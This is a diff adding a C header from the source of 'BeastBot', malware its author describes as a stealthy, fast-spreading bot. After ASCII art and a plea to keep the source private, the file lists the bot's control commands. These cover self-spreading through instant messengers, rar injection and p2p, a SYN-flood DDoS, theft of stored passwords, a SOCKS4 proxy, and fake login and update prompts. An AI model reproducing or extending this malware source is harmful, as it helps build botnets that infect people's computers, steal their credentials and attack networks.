@@ -1,0 +1,105 @@
+Author: -=C[o]NTeMPT=-                                                                           _
+                                                                         _( (~\
+                  _ _                        /                          ( \> > \
+              -/~/ / ~\                     :;                \       _  > /(~\/
+             || | | /\ ;\                   |l      _____     |;     ( \/    > >
+             _\\)\)\)/ ;;;                  `8o __-~     ~\   d|      \      //
+             ///(())(__/~;;\                  "88p;.  -. _\_;.oP        (_._/ /
+            (((__   __ \\   \                  `>,% (\  (\./)8"         ;:'  i
+            )))--`.'-- (( ;,8 \               ,;%%%:  ./V^^^V'          ;.   ;.
+            ((\   |   /)) .,88  `: ..,,;;;;,-::::::'_::\   ||\         ;[8:   ;
+            |)|  ~-~  |(|(888; ..``'::::8888oooooo.  :\`^^^/,,~--._    |88::  |
+             |\ -===- /|  \8;; ``:.      oo.8888888888:`((( o.ooo8888Oo;:;:'  |
+             |_~-___-~_|   `-\.   `        `o`88888888b` )) 888b88888P""'     ;
+              ~~~~;~~~~~      "`--_`.       b`888888888;(.,"888b888"  ..::;-'
+              ;      ;              ~"-....  b`8888888:::::.`8888. .:;;;''
+                 ;    ;                 `:::. `:::OOO:::::::.`OO' ;;;''
+                    ;                     `.      "``::::::''    .'
+                    ;                      `.   \_              /
+                                             +:   ~~--  `:'  -';
+                                           /\ `:         : .::/    .
+                                          / / ;;+_  :::. :..;;;  _//
+                                          \ \ ;;-   ::::::.:::; / /
+                                          /  \;;:        \ \;;;/ /
+
+66666666                    66              66666666666      66666666      66666  66666666666  
+66      66                 6666      6666        6           66      66  66     66     6       
+66       6     666        66  6     66   66      6           66       6  66     66     6      
+66      66   66   66      6   66    66           6           66      66  66     66     6      
+6666666666  66     66    66    66   66           6           6666666666  66     66     6      
+66       66 666666666   666666666    666666      6      =-=  66       66 66     66     6      
+66       66 66          66      66        66     6           66       66 66     66     6     
+66       66 666    66  66        66       66     6           66       66  6     6      6               
+666666666    6666666  66         66  66666       6           666666666     66666       6       
+_______________________________________________________________________________________________
+ 
+^^^^^^_BeastBot was developed to be a STABLE&Stealthy fast spreading bot_^^^^^^
+
+Note: This bot is private, if you happen to have SOURCE - PLEASE keep it PRIV PRIV PRIV.
+      Alot of Work has been put into this bot to make it as stable&Stealth as possible, 
+      Newer updates will be made FAST, Bugs if found will be fixed right away.
+      Report all bugs to godfather014@hotmail.com
+      If bot source is leaked, Future DEV will be stopped. Bot will be remade again. 
+      And no future updates will be available.
+      Do not fucking leak/Give to anyone if you got SOURCE.
+      Keep source code for your own personal use only.
+
+
+
+
+
+///////////////////////////////////////////////
+//               Commands                     /
+//////////////////////////////////////////////
+
+
+
+
+
+/////////////BASIC/////////////
+
+const char get_auth[]			= "Admin"; 
+const char cmd_join[]			= "goto";  
+const char cmd_part[]			= "part";  
+const char get_mnd[]			= "dw.start"; 
+const char cmd_dlstop[]			= "dw.stop";  
+const char get_upd[]			= "update";	  
+const char cmd_remove[]			= "selfterminate";	
+
+  
+/////////////SPREADS///////////
+const char cmd_msnspam[]		= "msn.msg";        
+const char cmd_msnemail[]		= "msn.msgemail";   
+const char cmd_msnstop[]		= "msn.stop";		
+const char cmd_msnsendzip[]		= "msn.sendzip";    
+const char cmd_msnstopzip[]		= "msn.stopzip";	
+const char cmd_timspread_1[]    = "triton.msg";		
+const char cmd_timspread_2[]    = "triton.stop";
+const char cmd_aimspread_1[]    = "aim.msg";		
+const char cmd_aimspread_2[]    = "aim.stop";
+const char cmd_winrar[]		= "rarinject";		
+const char cmd_p2pspread[]      = "p2p";	
+
+		
+/////////////OTHER////////////
+const char cmd_ddos_1[]	        = "supersyn";		
+const char cmd_ddos_2[]	        = "supersyn.stop";	
+const char cmd_pstore_2[]	= "pstore.search";	
+const char cmd_pstore_3[]	= "pstore.stop";	
+const char cmd_socks4[]	        = "socks4";			
+const char cmd_pstore_1[]	    = "pstore";
+#ifndef NO_VISIT
+const char cmd_visit[]		= "visit";
+#endif
+const char cmd_seed[]			= "seed.utorrent";
+#ifndef NO_BROWSERVISIT
+const char cmd_browser[] ="browser";
+#endif
+////////////////////////////
+
+///////////////////////////////
+const char cmd_fakelogin[]		= "login";
+const char cmd_fake_remove[]    = "remove";
+const char cmd_fakedownload[]   = "download";
+const char cmd_fakeupdate[]     = "update";
+///////////////////////////////
